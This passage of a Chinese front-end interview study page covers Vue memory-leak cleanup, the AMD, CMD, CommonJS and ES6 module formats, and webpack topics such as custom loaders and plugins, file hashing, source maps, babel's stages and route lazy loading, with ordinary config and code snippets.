对象的引用导致；</li> <li>JS 对象泄漏；</li> <li>通常由闭包导致，比如事件处理回调，导致 DOM 对象和脚本中对象双向引用，这个是常见的泄漏原因；</li></ol> <h5 id="代码关注点"><a href="#代码关注点" class="header-anchor">#</a> 代码关注点</h5> <p>主要关注的就是各种事件绑定场景，比如：</p> <ol><li>DOM 中的 <code>addEventLisner</code> 函数及派生的事件监听，比如 Jquery 中的 <code>on</code> 函数，Vue 组件实例的 <code>$on</code> 函数;</li> <li>其它 BOM 对象的事件监听， 比如 websocket 实例的 on 函数;</li> <li>避免不必要的函数引用；</li> <li>如果使用 <code>render</code> 函数，避免在 HTML 标签中绑定 DOM/BOM 事件;</li></ol> <h5 id="如何处理"><a href="#如何处理" class="header-anchor">#</a> 如何处理</h5> <ol><li>如果在 <code>mounted/created</code> 钩子中使用 JS 绑定了 DOM/BOM 对象中的事件，需要在 <code>beforeDestroy</code> 中做对应解绑处理；</li> <li>如果在 <code>mounted/created</code> 钩子中使用了第三方库初始化，需要在 <code>beforeDestroy</code> 中做对应销毁处理（一般用不到，因为很多时候都是直接全局 <code>Vue.use</code>）；</li> <li>如果组件中使用了 <code>setInterval</code>，需要在 <code>beforeDestroy</code> 中做对应销毁处理；</li> <li>模板中不要使用表达式来绑定到特定的处理函数，这个逻辑应该放在处理函数中；</li> <li>如果在mounted/created 钩子中使用了$on，需要在beforeDestroy 中做对应解绑($off)处理；</li> <li>某些组件在模板中使用 事件绑定可能会出现泄漏，使用$on 替换模板中的绑定；</li></ol> <h3 id="模块规范"><a href="#模块规范" class="header-anchor">#</a> 模块规范</h3> <blockquote><h4 id="js之amd、cmd、commonjs、es6、umd的使用"><a href="#js之amd、cmd、commonjs、es6、umd的使用" class="header-anchor">#</a> JS之AMD、CMD、CommonJS、ES6、UMD的使用</h4></blockquote> <h4 id="图示对比"><a href="#图示对比" class="header-anchor">#</a> 图示对比</h4> <p><img src="/rat-summ/assets/img/image-20200820091303580.2f0be835.png" alt="image-20200820091303580"></p> <h4 id="amd-和-cmd-的区别"><a href="#amd-和-cmd-的区别" class="header-anchor">#</a> AMD 和 CMD 的区别</h4> <ul><li>对于依赖的模块，**AMD 是提前执行，CMD 是延迟执行。**不过 RequireJS 从 2.0 开始，也改成可以延迟执行（根据写法不同，处理方式不同）。CMD 推崇 as lazy as possible.</li> <li><strong>AMD 推崇依赖前置, CMD 推崇依赖就近</strong>;</li></ul> <table><thead><tr><th>模块化</th> <th>代表应用</th> <th>特点</th></tr></thead> <tbody><tr><td>AMD</td> <td>require.js</td> <td>1、AMD的api默认一个当多个用 2、<strong>依赖前置</strong>，异步执行</td></tr> <tr><td>CMD</td> <td>sea.js</td> <td>1、CMD的api严格区分，推崇职责单一 2、<strong>依赖就近，按需加载</strong>，异步执行</td></tr></tbody></table> <h4 id="commonjs-和-es6-module的区别"><a href="#commonjs-和-es6-module的区别" class="header-anchor">#</a> Commonjs 和 ES6 Module的区别</h4> <p>取自<code>阿里巴巴淘系技术前端团队</code>的回答：</p> <ul><li><strong>Commonjs是拷贝输出，ES6模块化是引用输出</strong>；</li> <li><strong>Commonjs是运行时加载，ES6模块化是编译时输出接口</strong>；</li> <li><strong>Commonjs是动态语法可写在函数体中，ES6模块化静态语法只能写在顶层；</strong></li> <li>Commonjs是单个值导出，ES6模块化可以多个值导出</li> <li>Commonjs的this是当前模块化，ES6模块化的this是undefined</li></ul> <h2 id="webpack-10题"><a href="#webpack-10题" class="header-anchor">#</a> webpack[10题]</h2> <h3 id="_1-构建流程"><a href="#_1-构建流程" class="header-anchor">#</a> 1:构建流程</h3> <h4 id="工作流程"><a href="#工作流程" class="header-anchor">#</a> 工作流程</h4> <p>webpack<strong>本质上是一种事件流的机制</strong>，它的<strong>工作流程</strong>就是将各个插件串联起来，而实现的核心就是 <code>tapable</code></p> <p>webpack中最核心的<strong>负责编译的<code>Compiler</code>和负责创建bundles的<code>Compilation</code>都是Tapable的实例</strong>。</p> <h4 id="简述"><a href="#简述" class="header-anchor">#</a> <strong>简述</strong></h4> <ul><li>初始化：启动构建，读取与合并配置参数，加载 Plugin，实例化 Compiler</li> <li>编译：从 Entry 出发，针对每个 Module 串行调用对应的 Loader 去翻译文件的内容，再找到该 Module 依赖的 Module，递归地进行编译处理</li> <li>输出：将编译后的 Module 组合成 Chunk，将 Chunk 转换成文件，输出到文件系统中</li></ul> <h3 id="_2-loader与plugin"><a href="#_2-loader与plugin" class="header-anchor">#</a> 2:loader与plugin</h3> <h4 id="区别"><a href="#区别" class="header-anchor">#</a> 区别</h4> <h5 id="原理方面"><a href="#原理方面" class="header-anchor">#</a> 原理方面</h5> <p><strong><code>Loader</code> 本质就是一个函数</strong>，在<strong>该函数中对接收到的内容进行转换，返回转换后的结果</strong>。 因为 Webpack 只认识 JavaScript，所以 Loader 就成了翻译官，<strong>对其他类型的资源进行转译的预处理工作。</strong></p> <p><strong><code>Plugin</code> 就是插件，基于事件流框架 <code>Tapable</code></strong>，插件可以扩展 Webpack 的功能，在 Webpack 运行的生命周期中会广播出许多事件，Plugin 可以监听这些事件，在合适的时机通过 Webpack 提供的 API 改变输出结果。</p> <h5 id="配置方面"><a href="#配置方面" class="header-anchor">#</a> 配置方面</h5> <p><strong><code>Loader</code> 在 module.rules 中配置</strong>，作为模块的解析规则，类型为数组。<strong>每一项都是一个 Object，内部包含了 test(类型文件)、loader、options (参数)等属性。</strong></p> <p><strong><code>Plugin</code> 在 plugins 中单独配置</strong>，类型为数组，每一项是一个 Plugin 的实例，参数都通过构造函数传入。</p> <h4 id="自定义"><a href="#自定义" class="header-anchor">#</a> 自定义</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">convert</span><span class="token punctuation">(</span><span class="token parameter">source</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">return</span> source <span class="token operator">&amp;&amp;</span> source<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">hello</span><span class="token regex-delimiter">/</span><span class="token regex-flags">gi</span></span><span class="token punctuation">,</span><span class="token string">'HELLO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">//module.exports = function(content, map, meta) {}</span>
module<span class="token punctuation">.</span><span class="token function-variable function">exports</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">content</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token function">convert</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token comment">//custom-loader</span>

<span class="token comment">//使用；Npm link 模块注册； npm link custom-loader</span>
module<span class="token operator">:</span><span class="token punctuation">{</span>
    rules<span class="token operator">:</span><span class="token punctuation">[</span>
        <span class="token punctuation">{</span>
            test<span class="token operator">:</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.js</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span>
            use<span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">'custom-loader'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            include<span class="token operator">:</span>path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span><span class="token string">'show'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">class</span> <span class="token class-name">CustomPlugin</span><span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">doneCallback<span class="token punctuation">,</span> failCallback</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">// 保存在创建插件实例时传入的回调函数</span>
     <span class="token keyword">this</span><span class="token punctuation">.</span>doneCallback <span class="token operator">=</span> doneCallback<span class="token punctuation">;</span>
     <span class="token keyword">this</span><span class="token punctuation">.</span>failCallback <span class="token operator">=</span> failCallback<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">apply</span><span class="token punctuation">(</span><span class="token parameter">compiler</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    compiler<span class="token punctuation">.</span><span class="token function">plugin</span><span class="token punctuation">(</span><span class="token string">'done'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">stats</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span><span class="token comment">// 成功完成一次完整的编译和输出流程时，会触发 done 事件</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">doneCallback</span><span class="token punctuation">(</span>stats<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    compiler<span class="token punctuation">.</span><span class="token function">plugin</span><span class="token punctuation">(</span><span class="token string">'failed'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span><span class="token comment">// 在编译和输出的流程中遇到异常时，会触发 failed 事件</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">failCallback</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
module<span class="token punctuation">.</span>exports <span class="token operator">=</span> CustomPlugin<span class="token punctuation">;</span>

<span class="token comment">//使用；npm link custom-plugin</span>
plugins<span class="token operator">:</span><span class="token punctuation">[</span>
    <span class="token keyword">new</span> <span class="token class-name">CustomPlugin</span><span class="token punctuation">(</span>
        <span class="token parameter">stats</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'编译成功!'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token parameter">err</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'编译失败!'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
    <span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">,</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><h4 id="实践-2"><a href="#实践-2" class="header-anchor">#</a> 实践</h4> <blockquote><h4 id="文件指纹是什么-怎么用"><a href="#文件指纹是什么-怎么用" class="header-anchor">#</a> 文件指纹是什么？怎么用？</h4></blockquote> <p>文件指纹是<strong>打包后输出的文件名的后缀。</strong></p> <ul><li><code>Hash</code>：和整个项目的构建相关，**只要项目文件有修改，整个项目构建的 hash 值就会更改；**比如：图片处理file-loader；</li> <li><code>Chunkhash</code>：和 Webpack 打包的 chunk 有关，不同的 entry 会生出不同的 chunkhash；比如：js处理；</li> <li><code>Contenthash</code>：根据文件内容来定义 hash，<strong>文件内容不变，则 contenthash 不变</strong>；比如：样式处理；</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>
    entry<span class="token operator">:</span> <span class="token punctuation">{</span>
        app<span class="token operator">:</span> <span class="token string">'./scr/app.js'</span><span class="token punctuation">,</span>
        search<span class="token operator">:</span> <span class="token string">'./src/search.js'</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    output<span class="token operator">:</span> <span class="token punctuation">{</span>
        filename<span class="token operator">:</span> <span class="token string">'[name][chunkhash:8].js'</span><span class="token punctuation">,</span>
        path<span class="token operator">:</span>__dirname <span class="token operator">+</span> <span class="token string">'/dist'</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    module<span class="token operator">:</span><span class="token punctuation">{</span>
        rules<span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span>
            test<span class="token operator">:</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.(png|svg|jpg|gif)$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span>
            use<span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span>
                loader<span class="token operator">:</span><span class="token string">'file-loader'</span><span class="token punctuation">,</span>
                options<span class="token operator">:</span><span class="token punctuation">{</span>
                    name<span class="token operator">:</span><span class="token string">'img/[name][hash:8].[ext]'</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span><span class="token punctuation">]</span>
        <span class="token punctuation">}</span><span class="token punctuation">]</span>
    <span class="token punctuation">}</span>
    plugins<span class="token operator">:</span><span class="token punctuation">[</span>
        <span class="token keyword">new</span> <span class="token class-name">MiniCssExtractPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            filename<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">[name][contenthash:8].css</span><span class="token template-punctuation string">`</span></span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><h3 id="_3-source-map"><a href="#_3-source-map" class="header-anchor">#</a> 3:source map</h3> <blockquote><h4 id="source-map是什么-生产环境怎么用-【要点】"><a href="#source-map是什么-生产环境怎么用-【要点】" class="header-anchor">#</a> source map是什么？生产环境怎么用？【要点】</h4></blockquote> <p><strong><code>source map</code> 是将编译、打包、压缩后的代码映射回源代码的过程</strong>。打包压缩后的代码不具备良好的可读性，想要调试源码就需要 soucre map。</p> <p>map文件只要不打开开发者工具，浏览器是不会加载的。</p> <p>线上环境一般有三种处理方案：</p> <ul><li><code>hidden-source-map</code>：<strong>借助第三方错误监控平台 Sentry 使用</strong>;</li> <li><code>nosources-source-map</code>：只会显示具体行数以及查看源代码的错误栈。安全性比 sourcemap 高;</li> <li><code>sourcemap</code>：通过 nginx 设置将 .map 文件只对白名单开放(公司内网);</li></ul> <p>注意：<strong>避免在生产中使用 <code>inline-</code> 和 <code>eval-</code>，因为它们会增加 bundle 体积大小，并降低整体性能。</strong></p> <p><img src="/rat-summ/assets/img/164ffb2268a00140.4d8080c3.png" alt="sourceMap"></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span> 
    resolve<span class="token operator">:</span> <span class="token punctuation">{</span>
    extensions<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'.js'</span><span class="token punctuation">,</span> <span class="token string">'.css'</span><span class="token punctuation">,</span> <span class="token string">'.json'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment">// 文件扩展名，写明以后就不需要每个文件写后缀</span>
<span class="token comment">//config.resolve.alias.set('@$', resolve('src')) //vue.config.js的使用方式；</span>
    alias<span class="token operator">:</span> <span class="token punctuation">{</span><span class="token comment">// 路径别名，比如这里可以使用 css 指向 static/css 路径</span>
      <span class="token string">'@'</span><span class="token operator">:</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token string">'css'</span><span class="token operator">:</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'static/css'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token comment">//cheap不包含列信息（关于列信息的解释下面会有详细介绍)也不包含loader的sourcemap</span>
  <span class="token comment">//module包含loader的sourcemap（比如jsx to js ，babel的sourcemap）,否则无法定义源文件</span>
  <span class="token comment">//eva</span>
    l使用eval包裹模块代码
  <span class="token comment">//source-map产生.map文件</span>
  devtool<span class="token operator">:</span> <span class="token string">'cheap-module-eval-source-map'</span><span class="token punctuation">,</span> <span class="token comment">//开发环境</span>
  devtool<span class="token operator">:</span> <span class="token string">'cheap-module-source-map'</span><span class="token punctuation">,</span> <span class="token comment">//正式环境</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>4:热更新原理</p> <h3 id="_4-babel原理"><a href="#_4-babel原理" class="header-anchor">#</a> 4:babel原理</h3> <p><strong>babel的转译过程分为三个阶段：<code>parsing、transforming、generating</code>；</strong></p> <p>以ES6代码转译为ES5代码为例，babel转译的具体过程如下：</p> <ul><li>ES6代码输入；</li> <li>babylon 进行解析得到 AST；</li> <li>plugin 用 babel-traverse 对 AST 树进行遍历转译,得到新的AST树；</li> <li>用 babel-generator 通过 AST 树生成 ES5 代码；</li></ul> <p>大多数JavaScript Parser遵循 <code>estree</code> 规范，Babel 最初基于 <code>acorn</code> 项目(轻量级现代 JavaScript 解析器) Babel大概分为三大部分：</p> <ul><li>解析：<strong>将代码转换成 AST</strong>；
<ul><li>词法分析：将代码(字符串)分割为token流，即语法单元成的数组</li> <li>语法分析：分析token流(上面生成的数组)并生成 AST</li></ul></li> <li>转换：<strong>访问 AST 的节点进行变换操作生产新的 AST</strong>；
<ul><li><a href="https://github.com/NervJS/taro/blob/master/packages/taro-transformer-wx/src/index.ts%23L15" target="_blank" rel="noopener noreferrer">Taro<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>就是利用 babel 完成的小程序语法转换</li></ul></li> <li>生成：<strong>以新的 AST 为基础生成代码</strong>;</li></ul> <h3 id="_5-按需加载的原理"><a href="#_5-按需加载的原理" class="header-anchor">#</a> 5:按需加载的原理</h3> <h4 id="组件按需加载"><a href="#组件按需加载" class="header-anchor">#</a> 组件按需加载</h4> <p>原理：<code>node_modules/babel-plugin-component/lib/core.js</code></p> <p>简单来说，<code>babel-plugin-import</code> 就是解决了上面的问题，<strong>为组件库实现单组件按需加载并且自动引入其样式，如：</strong></p> <div class="language-jsx line-numbers-mode"><pre class="language-jsx"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Button <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'antd'</span><span class="token punctuation">;</span>

      ↓ ↓ ↓ ↓ ↓ ↓

<span class="token keyword">var</span> _button <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'antd/lib/button'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'antd/lib/button/style'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>在 babel 遍历 ast 的时候，这个插件主要关注了 ImportDeclaration 与 CallExpression 与 Program；</p> <p><strong>babel-plugin-component 插件在遍历节点的时候做的事情</strong></p> <ul><li>找到引入 element-ui 的类型为 ImportDeclaration 节点，将感兴趣的值存在对象里（比如引入 button，就存起来），之后移除当前这个节点。</li> <li>在遍历到 CallExpression 类型节点的时候（假设使用了 button，就判断是否存在了上面的对象里），之后创建新的 ImportDeclaration 节点，用于之后加载对应的 js 与 css 文件。</li></ul> <p><strong>总括：</strong></p> <p><code>babel-plugin-import</code> 和普遍的 <code>babel</code> 插件一样，会遍历代码的 <code>ast</code>，然后在 <code>ast</code> 上做了一些事情：</p> <ol><li><strong>收集依赖</strong>：找到 <code>importDeclaration</code>，分析出包 <code>a</code> 和依赖 <code>b,c,d....</code>，假如 <code>a</code> 和 <code>libraryName</code> 一致，就将 <code>b,c,d...</code> 在内部收集起来；</li> <li><strong>判断是否使用</strong>：在多种情况下（比如文中提到的 <code>CallExpression</code>）判断 收集到的 <code>b,c,d...</code> 是否在代码中被使用，如果有使用的，就调用 <code>importMethod</code> 生成新的 <code>impport</code> 语句；</li> <li><strong>生成引入代码</strong>：根据配置项生成代码和样式的 <code>import</code> 语句；</li></ol> <h4 id="路由按需加载"><a href="#路由按需加载" class="header-anchor">#</a> 路由按需加载</h4> <p>路由懒加载也可以叫做路由组件懒加载，最常用的是通过<code>import()</code>来实现它。</p> <p>非懒加载：</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">import</span> List <span class="token keyword">from</span> <span class="token string">'@/components/list.vue'</span>
<span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  routes<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span> path<span class="token operator">:</span> <span class="token string">'/list'</span><span class="token punctuation">,</span> component<span class="token operator">:</span> List <span class="token punctuation">}</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p><strong>方案一：使用箭头函数+require动态加载；vue异步组件</strong></p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Router</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  routes<span class="token operator">:</span> <span class="token punctuation">[</span>
   <span class="token punctuation">{</span>
     path<span class="token operator">:</span> <span class="token string">'/list'</span><span class="token punctuation">,</span>
     <span class="token function-variable function">component</span><span class="token operator">:</span> <span class="token parameter">resolve</span> <span class="token operator">=&gt;</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'@/components/list'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> resolve<span class="token punctuation">)</span>
   <span class="token punctuation">}</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p><strong>方案二：使用webpack的require.ensure技术</strong>，也可以实现按需加载。 这种情况下，多个路由指定相同的chunkName，会合并打包成一个js文件。</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// r就是resolve</span>
<span class="token keyword">const</span> <span class="token function-variable function">List</span> <span class="token operator">=</span> <span class="token parameter">r</span> <span class="token operator">=&gt;</span> require<span class="token punctuation">.</span><span class="token function">ensure</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">r</span><span class="token punctuation">(</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'@/components/list'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'list'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 路由也是正常的写法  这种是官方推荐的写的 按模块划分懒加载 </span>
<span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Router</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    routes<span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">{</span>
            path<span class="token operator">:</span> <span class="token string">'/list'</span><span class="token punctuation">,</span>
            name<span class="token operator">:</span> <span class="token string">'list'</span><span class="token punctuation">,</span>
            component<span class="token operator">:</span> List<span class="token punctuation">,</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p><strong>方案三(常用)：使用箭头函数+import动态加载；es6提案的import()</strong></p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">const</span> <span class="token function-variable function">List</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">'@/components/list.vue'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  routes<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span> path<span class="token operator">:</span> <span class="token string">'/list'</span><span class="token punctuation">,</span> component<span class="token operator">:</span> List <span class="token punctuation">}</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token keyword">function</span> <span class="token function">load</span><span class="token punctuation">(</span><span class="token parameter">component</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">import</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">views/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>component<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">//使编译打包后的js文件名字能和路由组件一一对应</span>
<span class="token keyword">function</span> <span class="token function">load</span><span class="token punctuation">(</span><span class="token parameter">component</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">import</span><span class="token punctuation">(</span><span class="token comment">/* webpackChunkName: &quot;[request]&quot; */</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">views/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>component<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
